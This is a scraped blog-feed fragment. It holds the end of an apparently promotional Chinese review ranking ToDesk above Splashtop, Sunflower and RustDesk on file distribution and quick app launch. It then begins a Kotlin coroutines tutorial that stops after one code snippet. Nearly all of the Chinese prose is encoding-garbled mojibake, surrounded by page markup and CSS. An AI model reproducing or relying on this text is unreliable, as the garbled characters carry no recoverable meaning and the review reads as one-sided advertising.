<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c37a789ac20e464d8b3c805321d7af98~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=Nnl4s%2BoMIkdQK7hDzf6MNZSgozo%3D" alt="" loading="lazy"/></p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cc4147810a664998a3864bc3cb94b30f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=L31DT8rC7TkfAvkTvgZMePyeLcw%3D" alt="" loading="lazy"/></p>
<p>â— <strong>æ•ˆç‡è¡¨ç°</strong>ï¼šæ€»è€—æ—¶åŸºæœ¬ç­‰äº<strong>å•æ¬¡ä¼ è¾“è€—æ—¶çš„3å€ï¼Œå†åŠ ä¸Šé¢å¤–çš„è¿æ¥ä¸æ–­å¼€å¼€é”€</strong>ã€‚</p>
<p>â— <strong>æ½œåœ¨æ›¿ä»£æ–¹æ¡ˆ</strong>ï¼šå‘æ—¥è‘µå’ŒSplashtopçš„ä¼ä¸šç‰ˆå¯èƒ½é€šè¿‡é›†æˆè„šæœ¬æˆ–ä¸ç¬¬ä¸‰æ–¹è®¾å¤‡ç®¡ç†å¹³å°é…åˆå®ç°æ‰¹é‡åˆ†å‘ï¼Œä½†è¿™è¶…å‡ºäº†æ™®é€šè½¯ä»¶åŠŸèƒ½èŒƒç•´ï¼Œå¢åŠ äº†å¤æ‚æ€§å’Œæˆæœ¬ã€‚</p>
<p/>
<h3 data-id="heading-10"><strong>å°ç»“ï¼š</strong></h3>
<p>åœ¨â€œä¸€å¯¹å¤šæ–‡ä»¶ç§’ä¼ â€è¿™ä¸ªç»´åº¦ä¸Šï¼Œ<strong>ToDesk****å®Œæˆäº†ä¸€æ¬¡â€œé™ç»´æ‰“å‡»â€</strong>ã€‚å®ƒç„å‡†çš„ä¸æ˜¯ä¼ è¾“é€Ÿåº¦çš„ç™¾åˆ†æ¯”æå‡ï¼Œè€Œæ˜¯å°†çº¿æ€§å·¥ä½œæµå‡çº§ä¸ºå¹¶è¡Œå·¥ä½œæµï¼Œä»æ ¹æœ¬ä¸Šè§£å†³äº†ITè¿ç»´ã€è½¯ä»¶éƒ¨ç½²ã€å†…å®¹åˆ†å‘çš„è§„æ¨¡åŒ–éš¾é¢˜ã€‚å¯¹äºéœ€è¦ç®¡ç†å¤šå°è®¾å¤‡ï¼ˆå¦‚ç”µç«é…’åº—ã€å­¦æ ¡æœºæˆ¿ã€ä¼ä¸šåŠå…¬åŒºï¼‰çš„ç”¨æˆ·è€Œè¨€ï¼Œè¿™æ˜¯ä¸€ä¸ªå…·æœ‰ç»å¯¹å¸å¼•åŠ›çš„â€œæ€æ‰‹çº§â€åŠŸèƒ½ï¼Œç›®å‰å…¶ä»–å¯¹æ‰‹å°šæ— ç›´æ¥ç«å“ã€‚</p>
<p/>
<p/>
<h2 data-id="heading-11"><strong>ä¸‰ã€****æµ‹è¯„ç»´åº¦ä¸‰ï¼šæ¸¸æˆä¸åº”ç”¨å¿«æ·å¯åŠ¨ â€”â€” â€œåŒ–ç¹ä¸ºç®€ï¼Œä¸€æ­¥åˆ°ä½â€</strong></h2>
<p/>
<p>è¿œç¨‹æ“ä½œçš„ç»ˆæä¾¿æ·ï¼Œæ˜¯å¿˜è®°â€œè¿œç¨‹â€æœ¬èº«ã€‚æˆ‘ä»¬ä¸åº”è¯¥å…ˆâ€œè¿›å…¥ä¸€ä¸ªé™Œç”Ÿçš„æ¡Œé¢â€ï¼Œå†åƒæœ¬åœ°ä¸€æ ·å¯»æ‰¾ç›®æ ‡ã€‚ç†æƒ³çš„çŠ¶æ€æ˜¯ï¼šæˆ‘æƒ³ç”¨å®¶é‡Œçš„ç”µè„‘ç©æŸæ¬¾æ¸¸æˆï¼Œç‚¹å‡»ä¸€ä¸ªå›¾æ ‡ï¼Œæ¸¸æˆå°±åœ¨æˆ‘å…¬å¸ç”µè„‘çš„å±å¹•ä¸Šå…¨å±è¿è¡Œäº†â€”â€”ä¸­é—´æ²¡æœ‰æ¡Œé¢ï¼Œæ²¡æœ‰æ–‡ä»¶å¤¹ï¼Œåªæœ‰ç»“æœã€‚</p>
<p/>
<h3 data-id="heading-12"><strong>ToDesk****â€œå¿«æ·å¯åŠ¨â€ï¼šæ·±åº¦é›†æˆï¼ŒåŒ–èº«æœ¬åœ°å¯åŠ¨å™¨</strong></h3>
<p>ToDeskå°†æ­¤åŠŸèƒ½åšåˆ°äº†æè‡´ï¼Œå®ƒä¸å†æ˜¯ä¸€ä¸ªâ€œè¿œç¨‹åŠŸèƒ½â€ï¼Œè€Œåƒä¸€ä¸ªæœ¬åœ°çš„æ¸¸æˆå¯åŠ¨å¹³å°ã€‚</p>
<p/>
<p>â— <strong>è®¾ç½®ä¸ä½¿ç”¨</strong>ï¼šåœ¨è®¾å¤‡åˆ—è¡¨å³é”®ç‚¹å‡»å—æ§è®¾å¤‡ï¼Œé€‰æ‹©â€œæ·»åŠ å¿«æ·å¯åŠ¨â€ã€‚ä½ å¯ä»¥<strong>ç›´æ¥æµè§ˆå—æ§ç«¯ç£ç›˜ï¼Œé€‰æ‹©.exeå¯æ‰§è¡Œæ–‡ä»¶</strong>ï¼ˆå¦‚steam.exeã€Photoshop.exeï¼‰ï¼Œæˆ–æ›´ç²¾å‡†åœ°é€‰æ‹©æ¸¸æˆä¸»ç¨‹åºã€‚å¯ä»¥è‡ªå®šä¹‰åç§°ã€å›¾æ ‡ï¼Œå¹¶å½’ç±»åˆ°â€œæ¸¸æˆâ€ã€â€œå·¥ä½œâ€ç­‰è‡ªå®šä¹‰é¢æ¿ä¸­ã€‚æœ€å¼ºå¤§çš„æ˜¯ï¼Œå¯ä»¥<strong>è®¾ç½®å¯åŠ¨åè‡ªåŠ¨å…¨å±ã€è‡ªåŠ¨éšè—<strong><strong>ToDesk</strong></strong>æ§åˆ¶æ </strong>ã€‚</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fd35ed712ee946e6b7e9e99f7ba6748b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=a0kzEKlNgb%2BDghc0Lzi22tCTKMk%3D" alt="" loading="lazy"/></p>
<p>â— <strong>ä½“éªŒ</strong>ï¼šç‚¹å‡»åˆ›å»ºå¥½çš„ã€ŠThe Forestã€‹å¿«æ·æ–¹å¼ï¼Œå‡ ä¹æ„Ÿè§‰ä¸åˆ°è¿æ¥è¿‡ç¨‹ï¼Œæ¸¸æˆå¯åŠ¨å™¨æˆ–æ¸¸æˆæœ¬ä½“ç›´æ¥åœ¨å…¨å±çª—å£ä¸­å‡ºç°ã€‚è·¯å¾„æ˜¯ï¼šç‚¹å‡»â†’ï¼ˆçŸ­æš‚é»‘å±/è¿æ¥ï¼‰â†’æ¸¸æˆç”»é¢ã€‚<strong>è·³è¿‡äº†â€œæ˜¾ç¤ºè¿œç¨‹æ¡Œé¢â†’æ‰¾åˆ°Steamå›¾æ ‡â†’ç‚¹å‡»â†’ç­‰å¾…å¯åŠ¨â€çš„å…¨è¿‡ç¨‹</strong>ã€‚å¯¹äºå›ºå®šå·¥ä½œæµï¼Œæ•ˆç‡æå‡æ˜¯é¢ è¦†æ€§çš„ã€‚</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/02efd2e3fdf045bd9fa84ff6df730677~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=sS8uzDNvZhJFX%2FMpEde%2BZTjHdsw%3D" alt="" loading="lazy"/></p>
<p>â— <strong>è‡ªå®šä¹‰é¢æ¿</strong>ï¼šç”¨æˆ·å¯ä»¥å°†ä¸åŒè®¾å¤‡çš„å¸¸ç”¨åº”ç”¨ã€æ¸¸æˆé›†ä¸­åœ¨ä¸€ä¸ªé¢æ¿ä¸Šï¼Œå®ç°è·¨è®¾å¤‡çš„â€œä¸€é”®å·¥ä½œå°â€ï¼Œæ„æƒ³éå¸¸å‰ç»ã€‚</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/818102a77b8b46629cd424ab3e4676ae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=tmRA0tFBtJWJm%2BILd3zUdioTyQM%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-13"><strong>Splashtop/å‘æ—¥è‘µ/RustDeskï¼šåŠŸèƒ½ç¼ºå¤±</strong></h3>
<p>ç›®å‰ç‰ˆæœ¬éœ€å…ˆå»ºç«‹å®Œæ•´çš„æ¡Œé¢æ§åˆ¶è¿æ¥ï¼Œæ— å¿«æ·å¯åŠ¨åŠŸèƒ½ã€‚</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c78a9112bcf54b7ab3998c522bb62dbb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=8BaaL4gokMrwjiJQ8PeHzK8eO6c%3D" alt="" loading="lazy"/></p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c20875413f7143838cd3f2a73fc0ed8d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=8DRyBtTYgN8cHFlvgJyZ9TeTHNY%3D" alt="" loading="lazy"/></p>
<p/>
<h3 data-id="heading-14"><strong>å°ç»“ï¼š</strong></h3>
<p>åœ¨â€œå¿«æ·å¯åŠ¨â€çš„ä½“éªŒç«èµ›ä¸­ï¼Œ<strong>ToDesk****å‡­å€Ÿå…¶æ·±åº¦é›†æˆçš„è®¾è®¡ç†å¿µå’Œä»¥ç”¨æˆ·åœºæ™¯ä¸ºä¸­å¿ƒçš„æ€è€ƒï¼Œå–å¾—äº†æ˜¾è‘—é¢†å…ˆ</strong>ã€‚å®ƒä¸ä»…ä»…æ˜¯æä¾›äº†ä¸€ä¸ªå¿«æ·æ–¹å¼ï¼Œæ›´æ˜¯é‡æ–°è®¾è®¡äº†ä»æ„å›¾åˆ°ç»“æœçš„äº¤äº’è·¯å¾„ï¼Œç‰¹åˆ«è´´åˆæ¸¸æˆç©å®¶å’Œæ‹¥æœ‰å›ºå®šå·¥ä½œæµçš„ä¸“ä¸šç”¨æˆ·éœ€æ±‚ã€‚</p>
<p/>
<p/>
<p/>
<h2 data-id="heading-15"><strong>å››ã€****æ€»ç»“ä¸é€‰è´­æŒ‡å—ï¼š</strong></h2>
<p>æ€»ç»“ä¸€å¥è¯ï¼šä½ çš„åœºæ™¯ï¼Œå†³å®šä½ çš„é€‰æ‹©</p>
<p>ç»è¿‡ä¸‰å¤§ç»´åº¦ï¼Œæˆ‘ä»¬å°†æ‰€æœ‰å…³é”®å‘ç°æµ“ç¼©ä¸ºä¸‹è¡¨ï¼ŒåŠ©ä½ ä¸€ç›®äº†ç„¶ï¼š</p>

































<table><thead><tr><th align="left">åŠŸèƒ½ç»´åº¦ / è½¯ä»¶</th><th align="left">ToDesk 2026æ–°ç‰ˆ</th><th align="left">Splashtop</th><th align="left">å‘æ—¥è‘µ</th><th align="left">RustDesk</th></tr></thead><tbody><tr><td align="left"><strong>æé™ç”»è´¨ä¸æµç•…åº¦</strong> ï¼ˆé«˜å¸§ç‡æ¸¸æˆ/åŠ¨æ€åœºæ™¯ï¼‰</td><td align="left"><strong>ä¼˜ç§€</strong> é«˜å¸§ç‡æ¨¡å¼é¢†å…ˆï¼Œå»¶è¿Ÿæœ€ä½ï¼ŒåŠ¨æ€æ¸…æ™°åº¦å¥½</td><td align="left"><strong>è‰¯å¥½</strong> ç”»è´¨æ‰å®ç¨³å®šï¼ŒåŠ¨æ€ç¨è½¯ï¼Œç»¼åˆä½“éªŒä½³</td><td align="left"><strong>è‰¯å¥½</strong> é™æ€ç”»è´¨ä¼˜ç§€ï¼ŒåŠ¨æ€æµç•…åº¦æœ‰æ³¢åŠ¨</td><td align="left"><strong>ä¸€èˆ¬</strong> å‹ç¼©æ„Ÿè¾ƒå¼ºï¼Œé«˜åŠ¨æ€ä¸‹å¡é¡¿æ˜æ˜¾</td></tr><tr><td align="left"><strong>ä¸€å¯¹å¤šæ–‡ä»¶ç§’ä¼ </strong> ï¼ˆæ‰¹é‡åˆ†å‘æ•ˆç‡ï¼‰</td><td align="left"><strong>ä¼˜ç§€****ç‹¬å®¶æ ¸å¿ƒåŠŸèƒ½</strong>ï¼Œå¹¶è¡Œä¼ è¾“ï¼Œæ•ˆç‡é©å‘½æ€§æå‡</td><td align="left"><strong>ä¸æ”¯æŒ</strong> éœ€æ‰‹åŠ¨é€å°æ“ä½œ</td><td align="left"><strong>ä¸æ”¯æŒ</strong> éœ€æ‰‹åŠ¨é€å°æ“ä½œ</td><td align="left"><strong>ä¸æ”¯æŒ</strong> éœ€æ‰‹åŠ¨é€å°æ“ä½œ</td></tr><tr><td align="left"><strong>æ¸¸æˆ/åº”ç”¨å¿«æ·å¯åŠ¨</strong> ï¼ˆç›´è¾¾ç›®æ ‡ï¼Œå‡å°‘æ“ä½œæ­¥æ•°ï¼‰</td><td align="left"><strong>ä¼˜ç§€</strong> æ·±åº¦é›†æˆï¼Œæµè§ˆæ·»åŠ ï¼Œä¸€é”®å…¨å±ç›´è¾¾ï¼Œä½“éªŒæœ€ä½³</td><td align="left"><strong>ä¸æ”¯æŒ</strong> æ”¯æŒåº”ç”¨å¿«æ·æ–¹å¼ï¼Œå¯¹æ¸¸æˆå¯åŠ¨å™¨æ”¯æŒä¸€èˆ¬</td><td align="left"><strong>ä¸æ”¯æŒ</strong> å¯é€šè¿‡å¤šæ¡Œé¢æˆ–CMDå®ç°ï¼Œæœ‰ä¸€å®šå­¦ä¹ æˆæœ¬</td><td align="left"><strong>ä¸æ”¯æŒ</strong> éœ€å…ˆæ§åˆ¶æ¡Œé¢</td></tr></tbody></table>
<h3 data-id="heading-16"><strong/></h3>
<h3 data-id="heading-17"><strong>æœ€ç»ˆå»ºè®®ï¼š</strong></h3>
<p>ä»â€œè¿é€šæ€§â€åˆ°â€œåœºæ™¯åŒ–æ•ˆç‡â€çš„æ—¶ä»£æŠ‰æ‹©</p>
<p/>
<p>è¿œç¨‹æ§åˆ¶è½¯ä»¶çš„å¸‚åœºç«äº‰ï¼Œå·²ç»æ‚„ç„¶è¿›å…¥äº†ç¬¬äºŒé˜¶æ®µã€‚ç¬¬ä¸€é˜¶æ®µæ¯”æ‹¼çš„æ˜¯â€œè°èƒ½è¿å¾—ä¸Šã€è¿å¾—ç¨³â€ï¼Œè¿™ä¸ªé—®é¢˜åœ¨ä»Šå¤©å·²åŸºæœ¬å¾—åˆ°è§£å†³ã€‚è€Œç¬¬äºŒé˜¶æ®µï¼Œæ­£å¦‚æœ¬æ¬¡æ¨ªæµ‹æ‰€æ­ç¤ºçš„ï¼Œ<strong>æ ¸å¿ƒæ˜¯â€œè°èƒ½åœ¨ç‰¹å®šçš„æ·±åº¦åœºæ™¯ä¸­ï¼Œæä¾›è¶…è¶Šè¿æ¥æœ¬èº«çš„æ•ˆç‡ä¸ä½“éªŒå¢å€¼â€ã€‚</strong></p>
<p/>
<p><strong>ToDesk<strong><strong> 2026æ–°ç‰ˆ</strong></strong>æœ¬****æ‰€å±•ç°å‡ºçš„ã€é’ˆå¯¹è¿™äº›ç—›ç‚¹çš„ç²¾å‡†åˆ›æ–°å’Œå“è¶Šå®ç°ï¼Œä½¿å®ƒæˆä¸ºäº†ä¸€ä¸ªä½ å¿…é¡»è®¤çœŸè€ƒè™‘ã€ç”šè‡³ç›®å‰çœ‹æ¥æœ€å…·å‰ç»æ€§çš„é€‰æ‹©</strong>ã€‚å®ƒæˆ–è®¸ä¸æ˜¯æ¯ä¸ªç»†èŠ‚éƒ½å®Œç¾æ— ç‘•ï¼Œä½†å®ƒæ­£æ¸…æ™°åœ°æŒ‡å‘è¿œç¨‹æ§åˆ¶å·¥å…·çš„æœªæ¥ï¼š<strong>æ›´æ™ºèƒ½ã€æ›´é«˜æ•ˆã€æ›´æ— ç¼åœ°èå…¥æˆ‘ä»¬æ¯ä¸€ä¸ªå…·ä½“çš„å·¥ä½œä¸ç”Ÿæ´»åœºæ™¯ã€‚</strong></p>
<p/>
<p>æŠ€æœ¯æœåŠ¡äºäººï¼Œè€Œæœ€å¥½çš„æœåŠ¡ï¼Œæ˜¯è®©äººå¿˜è®°æŠ€æœ¯æœ¬èº«çš„å­˜åœ¨ã€‚åœ¨è¿™åœºé€šå¾€â€œæ— å½¢â€çš„ç«èµ›ä¸­ï¼Œé¢†å…ˆè€…å·²ç»å‡ºå‘ã€‚</p>
<p/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Kotlin åç¨‹-åŸºç¡€ç¯‡]]></title>    <link>https://juejin.cn/post/7597125475601629211</link>    <guid>https://juejin.cn/post/7597125475601629211</guid>    <pubDate>2026-01-20T10:26:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597125475601629211" data-draft-id="7596874392824873002" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Kotlin åç¨‹-åŸºç¡€ç¯‡"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-01-20T10:26:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Jony_"/> <meta itemprop="url" content="https://juejin.cn/user/3403743732709767"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Kotlin åç¨‹-åŸºç¡€ç¯‡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3403743732709767/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Jony_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T10:26:21.000Z" title="Tue Jan 20 2026 10:26:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€å‰è¨€</h2>
<p>æœ¬æœŸæ˜¯åç¨‹çš„åŸºç¡€ç¯‡ï¼Œä¼šä»åç¨‹ä½œç”¨åŸŸã€ä¸Šä¸‹æ–‡ã€å¯åŠ¨æ¨¡å¼ç­‰æ–¹é¢è®²è¿°å¦‚ä½•å»ä½¿ç”¨åç¨‹ã€‚å¹¶ä¸”ï¼Œä¼šåŸºäºåç¨‹æä¾›çš„æ¡†æ¶ï¼Œå°è£…å·¥ä½œä¸­å¸¸ç”¨çš„åŸºç¡€èƒ½åŠ›ã€‚</p>
<h2 data-id="heading-1">äºŒã€åç¨‹ä½œç”¨åŸŸ</h2>
<p>åˆå­¦åç¨‹çš„æ—¶å€™ï¼Œå°±å¬è¯´è¿‡æŒ‚èµ·å‡½æ•°å¿…é¡»åœ¨å¦ä¸€ä¸ªæŒ‚èµ·å‡½æ•°ä¸­æˆ–è€…åç¨‹ä½œç”¨åŸŸä¸­æ‰èƒ½è¢«è°ƒç”¨ã€‚é‚£ä¹ˆï¼Œåç¨‹ä½œç”¨åŸŸæ˜¯ä»€ä¹ˆï¼Ÿå¦‚ä½•åˆ›å»ºä¸€ä¸ªåç¨‹ä½œç”¨åŸŸï¼Ÿ</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    GlobalScope.launch { }
}

<span class="hljs-keyword">object</span> GlobalScope : CoroutineScope {
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> coroutineContext: CoroutineContext
        <span class="hljs-keyword">get</span>() = EmptyCoroutineContext
}
</code></pre>
